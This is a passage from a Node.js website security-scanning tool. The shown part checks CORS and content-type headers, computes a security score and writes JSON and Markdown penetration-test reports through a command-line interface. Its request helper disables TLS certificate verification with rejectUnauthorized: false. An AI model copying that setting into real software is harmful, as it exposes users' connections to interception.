                severity: corsIssues.filter(i => i.severity === 'high').length > 0 ? 'high' : 
                         corsIssues.length > 0 ? 'medium' : 'low',
                details: {
                    corsIssues,
                    corsHeaders: corsHeaders.filter(h => headers[h.toLowerCase()]).map(h => ({
                        header: h,
                        value: headers[h.toLowerCase()]
                    }))
                }
            });
        } catch (error) {
            this.addResult('securityConfiguration', 'cors_configuration', {
                status: 'passed',
                message: 'OPTIONS method not supported (expected for static sites)',
                severity: 'low'
            });
        }
    }

    async testContentTypeValidation() {
        const testFiles = [
            { path: '/', expectedType: 'text/html' },
            { path: '/robots.txt', expectedType: 'text/plain' },
            { path: '/sitemap.xml', expectedType: 'application/xml' }
        ];

        let contentTypeIssues = [];

        for (const test of testFiles) {
            try {
                const response = await this.makeRequest(`${this.target}${test.path}`, { method: 'HEAD' });
                const contentType = response.headers['content-type'];
                
                if (contentType && !contentType.includes(test.expectedType)) {
                    contentTypeIssues.push({
                        path: test.path,
                        expected: test.expectedType,
                        actual: contentType,
                        issue: 'Incorrect content type'
                    });
                }

                // Check for missing X-Content-Type-Options
                if (!response.headers['x-content-type-options']) {
                    contentTypeIssues.push({
                        path: test.path,
                        issue: 'Missing X-Content-Type-Options header',
                        severity: 'medium'
                    });
                }
            } catch (error) {
                // Expected for some files
            }
        }

        this.addResult('securityConfiguration', 'content_type_validation', {
            status: contentTypeIssues.length > 0 ? 'warning' : 'passed',
            message: contentTypeIssues.length > 0 ? 
                `${contentTypeIssues.length} content type issues found` :
                'Content type validation passed',
            severity: contentTypeIssues.length > 0 ? 'low' : 'low',
            details: {
                contentTypeIssues,
                testedFiles: testFiles.length
            }
        });
    }

    // Helper methods
    async makeRequest(url, options = {}) {
        return new Promise((resolve, reject) => {
            const urlObj = new URL(url);
            const requestOptions = {
                hostname: urlObj.hostname,
                port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
                path: urlObj.pathname + urlObj.search,
                method: options.method || 'GET',
                headers: options.headers || {},
                timeout: this.timeout,
                rejectUnauthorized: false // For testing purposes
            };

            const client = urlObj.protocol === 'https:' ? https : http;
            const req = client.request(requestOptions, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        body
                    });
                });
            });

            req.on('error', reject);
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });
            
            if (options.body) {
                req.write(options.body);
            }
            
            req.end();
        });
    }

    addResult(category, testName, result) {
        if (!this.results[category]) {
            this.results[category] = {};
        }
        
        this.results[category][testName] = {
            ...result,
            timestamp: new Date().toISOString()
        };

        // Update summary
        switch (result.status) {
            case 'passed':
                this.results.summary.passed++;
                break;
            case 'failed':
                this.results.summary.failed++;
                if (result.severity === 'critical') {
                    this.results.summary.critical++;
                }
                break;
            case 'warning':
                this.results.summary.warnings++;
                break;
        }

        // Log result
        const emoji = result.status === 'passed' ? '✅' : 
                     result.status === 'failed' ? '❌' : 
                     result.status === 'warning' ? '⚠️' : '❓';
        this.log(`${emoji} ${testName}: ${result.message}`, result.status === 'failed' ? 'error' : 'info');
    }

    async generateReport() {
        const report = {
            metadata: {
                timestamp: new Date().toISOString(),
                target: this.target,
                cloudfrontDomain: this.cloudfrontDomain,
                s3BucketName: this.s3BucketName,
                testDuration: Date.now() - this.startTime
            },
            summary: {
                ...this.results.summary,
                totalTests: this.results.summary.passed + this.results.summary.failed + this.results.summary.warnings,
                securityScore: this.calculateSecurityScore(),
                riskLevel: this.calculateRiskLevel()
            },
            results: this.results
        };

        // Save detailed report
        const reportPath = path.join(process.cwd(), `penetration-test-report-${Date.now()}.json`);
        await fs.writeFile(reportPath, JSON.stringify(report, null, 2));

        // Generate summary report
        const summaryReport = this.generateSummaryReport(report);
        const summaryPath = path.join(process.cwd(), `penetration-test-summary-${Date.now()}.md`);
        await fs.writeFile(summaryPath, summaryReport);

        this.log(`📊 Reports generated:`, 'success');
        this.log(`   Detailed: ${reportPath}`, 'info');
        this.log(`   Summary: ${summaryPath}`, 'info');

        return { report, reportPath, summaryPath };
    }

    calculateSecurityScore() {
        const { passed, failed, warnings } = this.results.summary;
        const total = passed + failed + warnings;
        
        if (total === 0) return 0;
        
        // Weight different result types
        const weightedScore = (passed * 1.0 + warnings * 0.5 + failed * 0.0) / total;
        return Math.round(weightedScore * 100);
    }

    calculateRiskLevel() {
        const { critical, failed, warnings } = this.results.summary;
        
        if (critical > 0) return 'CRITICAL';
        if (failed > 5) return 'HIGH';
        if (failed > 2) return 'MEDIUM';
        if (warnings > 5) return 'LOW';
        return 'MINIMAL';
    }

    generateSummaryReport(report) {
        const { metadata, summary, results } = report;
        
        let markdown = `# Penetration Testing Report\n\n`;
        markdown += `**Target:** ${metadata.target}\n`;
        markdown += `**Generated:** ${metadata.timestamp}\n`;
        markdown += `**Test Duration:** ${Math.round(metadata.testDuration / 1000)}s\n\n`;
        
        markdown += `## Executive Summary\n\n`;
        markdown += `- **Security Score:** ${summary.securityScore}%\n`;
        markdown += `- **Risk Level:** ${summary.riskLevel}\n`;
        markdown += `- **Total Tests:** ${summary.totalTests}\n`;
        markdown += `- **Passed:** ${summary.passed} ✅\n`;
        markdown += `- **Failed:** ${summary.failed} ❌\n`;
        markdown += `- **Warnings:** ${summary.warnings} ⚠️\n`;
        markdown += `- **Critical Issues:** ${summary.critical} 🚨\n\n`;

        if (summary.critical > 0) {
            markdown += `## 🚨 Critical Security Issues\n\n`;
            this.addCategoryResults(markdown, results, 'failed', 'critical');
        }

        if (summary.failed > 0) {
            markdown += `## ❌ Security Failures\n\n`;
            this.addCategoryResults(markdown, results, 'failed', 'high');
            this.addCategoryResults(markdown, results, 'failed', 'medium');
        }

        if (summary.warnings > 0) {
            markdown += `## ⚠️ Security Warnings\n\n`;
            this.addCategoryResults(markdown, results, 'warning');
        }

        markdown += `## ✅ Passed Security Tests\n\n`;
        this.addCategoryResults(markdown, results, 'passed');

        markdown += `\n## Recommendations\n\n`;
        markdown += this.generateRecommendations(summary);

        markdown += `\n## Test Categories\n\n`;
        markdown += `### Vulnerability Tests\n`;
        markdown += `Tests for common web application vulnerabilities including XSS, SQL injection, directory traversal, and input validation issues.\n\n`;
        
        markdown += `### S3 Access Control Tests\n`;
        markdown += `Validation of S3 bucket access controls, direct access prevention, and proper CloudFront integration.\n\n`;
        
        markdown += `### Information Disclosure Tests\n`;
        markdown += `Detection of sensitive information exposure through error messages, debug information, backup files, and source code.\n\n`;
        
        markdown += `### Security Configuration Tests\n`;
        markdown += `Validation of security headers, SSL configuration, CORS policies, and content type handling.\n\n`;

        return markdown;
    }

    addCategoryResults(markdown, results, status, severity = null) {
        Object.entries(results).forEach(([category, tests]) => {
            if (category === 'summary') return;
            
            Object.entries(tests).forEach(([testName, test]) => {
                if (test.status === status && (!severity || test.severity === severity)) {
                    const categoryName = category.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
                    markdown += `- **${categoryName} - ${testName.replace(/_/g, ' ')}**: ${test.message}\n`;
                    
                    if (test.details && Object.keys(test.details).length > 0) {
                        const detailKeys = Object.keys(test.details).slice(0, 3); // Limit details
                        detailKeys.forEach(key => {
                            const value = test.details[key];
                            if (Array.isArray(value) && value.length > 0) {
                                markdown += `  - ${key}: ${value.length} items\n`;
                            } else if (typeof value === 'number') {
                                markdown += `  - ${key}: ${value}\n`;
                            }
                        });
                    }
                }
            });
        });
    }

    generateRecommendations(summary) {
        let recommendations = '';
        
        if (summary.critical > 0) {
            recommendations += `- **IMMEDIATE ACTION REQUIRED**: Address ${summary.critical} critical security issues\n`;
            recommendations += `- Conduct emergency security review and implement fixes\n`;
            recommendations += `- Consider taking the application offline until critical issues are resolved\n`;
        }
        
        if (summary.failed > 0) {
            recommendations += `- Address ${summary.failed} security failures before production deployment\n`;
            recommendations += `- Implement proper input validation and output encoding\n`;
            recommendations += `- Review and strengthen access controls\n`;
        }
        
        if (summary.warnings > 0) {
            recommendations += `- Review ${summary.warnings} security warnings and implement improvements\n`;
            recommendations += `- Enhance security headers and configuration\n`;
        }
        
        recommendations += `- Implement regular automated security testing\n`;
        recommendations += `- Conduct periodic manual penetration testing\n`;
        recommendations += `- Monitor security configurations for drift\n`;
        recommendations += `- Maintain an incident response plan\n`;
        
        return recommendations;
    }
}

// CLI Interface
async function main() {
    const args = process.argv.slice(2);
    const options = { verbose: false };
    
    for (let i = 0; i < args.length; i++) {
        switch (args[i]) {
            case '--target':
                options.target = args[++i];
                break;
            case '--cloudfront':
                options.cloudfrontDomain = args[++i];
                break;
            case '--s3-bucket':
                options.s3BucketName = args[++i];
                break;
            case '--timeout':
                options.timeout = parseInt(args[++i]) || 10000;
                break;
            case '--verbose':
                options.verbose = true;
                break;
            case '--help':
                console.log(`
Penetration Testing Suite for S3 + CloudFront Deployment

Usage: node penetration-testing-suite.js [options]

Options:
  --target <url>              Target URL to test (required)
  --cloudfront <domain>       CloudFront domain to test
  --s3-bucket <name>          S3 bucket name for access testing
  --timeout <ms>              Request timeout in milliseconds (default: 10000)
  --verbose                   Enable verbose logging
  --help                      Show this help message

Examples:
  node penetration-testing-suite.js --target https://example.com
  node penetration-testing-suite.js --target https://example.com --cloudfront d123456.cloudfront.net --verbose
  node penetration-testing-suite.js --target https://example.com --s3-bucket my-bucket --timeout 15000
                `);
                process.exit(0);
        }
    }

    if (!options.target) {
        console.error('❌ Error: --target is required');
        console.error('Use --help for usage information');
        process.exit(1);
    }

    console.log('🔍 Starting Penetration Testing Suite...\n');

    const suite = new PenetrationTestingSuite(options);
    suite.startTime = Date.now();
    
    try {
        const { report, reportPath, summaryPath } = await suite.runAllTests();
        
        console.log('\n' + '='.repeat(60));
        console.log('🔒 PENETRATION TESTING COMPLETE');
        console.log('='.repeat(60));
        console.log(`Security Score: ${report.summary.securityScore}%`);
        console.log(`Risk Level: ${report.summary.riskLevel}`);
        console.log(`Total Tests: ${report.summary.totalTests}`);
        console.log(`Critical Issues: ${report.summary.critical}`);
        console.log(`Failed Tests: ${report.summary.failed}`);
        console.log(`Warnings: ${report.summary.warnings}`);
        console.log('='.repeat(60));
        
        if (report.summary.critical > 0) {
            console.log('\n🚨 CRITICAL SECURITY ISSUES FOUND!');
            console.log('Immediate action required before production deployment.');
            process.exit(1);
        } else if (report.summary.failed > 0) {
            console.log('\n❌ Security issues found that should be addressed.');
            process.exit(1);
        } else if (report.summary.warnings > 0) {
            console.log('\n⚠️ Security warnings found - review recommended.');
        } else {
            console.log('\n✅ All penetration tests passed!');
        }

    } catch (error) {
        console.error(`\n❌ Penetration testing failed: ${error.message}`);
        if (options.verbose) {
            console.error(error.stack);
        }
        process.exit(1);
    }
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = PenetrationTestingSuite;